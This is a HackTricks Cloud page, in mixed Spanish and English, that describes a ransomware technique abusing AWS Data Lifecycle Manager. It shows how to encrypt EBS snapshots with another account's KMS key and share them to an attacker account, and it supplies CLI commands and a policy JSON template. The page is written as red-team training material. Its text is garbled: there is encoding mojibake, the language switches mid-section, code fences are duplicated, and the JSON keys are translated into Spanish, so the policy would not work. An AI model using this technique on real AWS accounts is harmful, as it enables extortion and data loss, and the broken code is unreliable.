# AWS - Administrador del Ciclo de Vida de Datos

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Administrador del Ciclo de Vida de Datos (DLM)

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

Un ataque de ransomware puede ser ejecutado cifrando tantos vol칰menes EBS como sea posible y luego borrando las instancias EC2 actuales, los vol칰menes EBS y las instant치neas. Para automatizar esta actividad maliciosa, se puede emplear Amazon DLM, cifrando las instant치neas con una clave KMS de otra cuenta de AWS y transfiriendo las instant치neas cifradas a una cuenta diferente. Alternativamente, podr칤an transferir instant치neas sin cifrar a una cuenta que gestionan y luego cifrarlas all칤. Aunque no es directo cifrar vol칰menes EBS o instant치neas existentes directamente, es posible hacerlo creando un nuevo volumen o instant치nea.

En primer lugar, se utilizar치 un comando para recopilar informaci칩n sobre los vol칰menes, como el ID de la instancia, el ID del volumen, el estado de cifrado, el estado de adjunto y el tipo de volumen.
```aws ec2 describe-volumes```

Secondly, one will create the lifecycle policy. This command employs the DLM API to set up a lifecycle policy that automatically takes daily snapshots of specified volumes at a designated time. It also applies specific tags to the snapshots and copies tags from the volumes to the snapshots. The policyDetails.json file includes the lifecycle policy's specifics, such as target tags, schedule, the ARN of the optional KMS key for encryption, and the target account for snapshot sharing, which will be recorded in the victim's CloudTrail logs.


```bash
```bash
aws dlm create-lifecycle-policy --description "Mi primera pol칤tica" --state ENABLED --execution-role-arn arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole --policy-details file://policyDetails.json
```
```

A template for the policy document can be seen here:
```bash
```json
{
   "TipoPol칤tica": "ADMINISTRACI칍N_DE_SNAPSHOTS_EBS",
   "TiposDeRecursos": [
      "VOLUMEN"
   ],
   "EtiquetasObjetivo": [
      {
         "Clave": "ClaveEjemplo",
         "Valor": "ValorEjemplo"
      }
   ],
   "Programaciones": [
      {
         "Nombre": "Instant치neasDiarias",
         "CopiarEtiquetas": true,
         "EtiquetasAAgregar": [
            {
               "Clave": "CreadorInstant치nea",
               "Valor": "DLM"
            }
         ],
         "EtiquetasVariables": [
            {
               "Clave": "CentroDeCostos",
               "Valor": "Finanzas"
            }
         ],
         "ReglaCreaci칩n": {
            "Intervalo": 24,
            "UnidadIntervalo": "HORAS",
            "Horas": [
               "03:00"
            ]
         },
         "ReglaRetenci칩n": {
            "Cantidad": 14
         },
         "ReglaRestauraci칩nR치pida": {
            "Cantidad": 2,
            "Intervalo": 12,
            "UnidadIntervalo": "HORAS"
         },
         "ReglasCopiaInterregional": [
            {
               "Regi칩nObjetivo": "us-west-2",
               "Encriptado": true,
               "ArnCmk": "arn:aws:kms:us-west-2:123456789012:key/your-kms-key-id",
               "CopiarEtiquetas": true,
               "ReglaRetenci칩n": {
                  "Intervalo": 1,
                  "UnidadIntervalo": "D칈AS"
               }
            }
         ],
         "ReglasCompartir": [
            {
               "CuentasObjetivo": [
                  "123456789012"
               ],
               "IntervaloNoCompartir": 30,
               "UnidadIntervaloNoCompartir": "D칈AS"
            }
         ]
      }
   ],
   "Par치metros": {
      "ExcluirVolumenArranque": false
   }
}
```
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
